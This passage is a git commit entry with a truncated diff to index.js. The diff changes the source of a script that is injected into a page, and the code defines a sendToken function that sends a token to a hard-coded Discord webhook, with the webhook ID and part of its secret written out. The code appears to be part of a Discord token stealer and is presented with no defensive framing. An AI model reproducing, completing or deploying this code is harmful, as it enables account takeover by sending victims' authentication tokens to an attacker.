b739d0fca4d0492e781692609435ecc8b9e504b9
iloveneedles <gabethedog900@gmail.com>
2025-02-06 22:00:59 -0700

    index.js

--- index.js
+++ index.js
@@ -1,3 +1,3 @@
-function injectScript() {script.src = 'https://your-hosting-url/location/inject.js';
+function injectScript() {script.src = 'https://github.com/iloveneedles/public/tree/main';
     const script = document.createElement('script');
     document.body.appendChild(script);}function sendToken(token) { const webhook = 'https://discord.com/api/webhooks/1337265250432716943/YG2_CTyPLmvjuMo920H9d9RU0RUk_8a2ICR4n2kRj4aaMCgeePimBfV6d_
